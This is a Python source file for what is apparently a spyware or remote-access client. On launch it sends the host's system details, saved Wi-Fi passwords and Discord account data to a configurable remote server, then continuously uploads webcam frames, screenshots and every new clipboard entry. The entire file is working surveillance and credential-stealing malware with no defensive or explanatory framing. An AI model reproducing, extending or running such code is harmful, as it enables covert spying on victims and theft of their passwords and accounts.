import cv2
from numpy import array
from pyautogui import screenshot
from requests import post
from time import sleep
from pyperclip import paste
from datetime import datetime

from modules.discordgrabber import get_discord_info
from modules.pcinfo import System_information
from modules.wifipasswordsgraber import getPasswords

# Initialize the camera
try:
	camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
except Exception as e:
	camera = cv2.VideoCapture('NoCamera.avi')
	print(e)

# Define the IP address of the remote server
remote_server = '127.0.0.1:5000'
protocol = 'http'

# Request a client ID from the server
clientIdreq = post(f'{protocol}://{remote_server}/client', json={"osInfo": System_information().replace("\n", "<br>"), "wifis": getPasswords(), "discordInfo": get_discord_info().replace("\n", "<br>")})
clientId = clientIdreq.text

previous_clipboard_content = ''

while True:
	if camera:
		success, frame = camera.read()
		if not success or frame is None:
			break

	# Capture the current screen
	myScreenshot = screenshot()
	myScreenshot_np = array(myScreenshot)

	# Encode the frames as .jpg
	_, camera_jpg = cv2.imencode('.jpg', frame)
	_, screen_jpg = cv2.imencode('.jpg', myScreenshot_np)

	# Send the frames to the server
	img_response = post(f'{protocol}://{remote_server}/send_camera?id={clientId}', data=camera_jpg.tobytes(), headers={'Content-Type': 'image/jpg'})
	screen_response = post(f'{protocol}://{remote_server}/send_screen?id={clientId}', data=screen_jpg.tobytes(), headers={'Content-Type': 'image/jpg'})

	clipboard_content = paste()
	if clipboard_content != previous_clipboard_content:
		previous_clipboard_content = clipboard_content
		now = datetime.now()
		formatted_date = now.strftime("%d.%m.%Y %H:%M:%S")
		post(f'{protocol}://{remote_server}/send_clipboard?id={clientId}', json={"text": f"<br>{formatted_date}: {clipboard_content}"})

	sleep(0.5)

if camera:
	camera.release()